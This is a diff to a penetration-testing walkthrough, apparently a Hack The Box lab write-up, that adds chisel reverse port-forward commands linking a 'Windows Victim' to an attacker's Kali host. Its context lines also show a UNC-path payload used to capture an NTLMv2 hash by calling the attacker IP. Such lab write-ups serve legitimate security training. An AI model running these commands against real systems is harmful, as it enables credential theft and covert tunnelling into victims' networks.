@@ -310,7 +310,7 @@ Capture NTLMv2 Hash:
 php?view=//10.10.14.38/gethackedlol
 ```
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">We captured the NTLMv2 hash of svc\_apache!</mark>
 
@@ -569,7 +569,23 @@ Armed with that knowledge, we might want to forward this port to our attack mach
 
 We can use [chisel](https://github.com/jpillora/chisel/releases/tag/v1.8.1) for this!
 
-Be sure to copy chisel over for&#x20;
+Be sure to copy chisel over via SMB to establish the port forward.
+
+Client (On Windows Victim):
+
+```
+.\chisel.exe client 10.10.14.38:9999 R:8000:127.0.0.1:8000
+```
+
+Server (Kali):
+
+```
+chisel server --reverse -p 9999
+```
+
+Now, upon visiting 127.0.0.1:8000 on our kali box in our browser, we will see:
+
+<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 ### PrivEsc vector
 
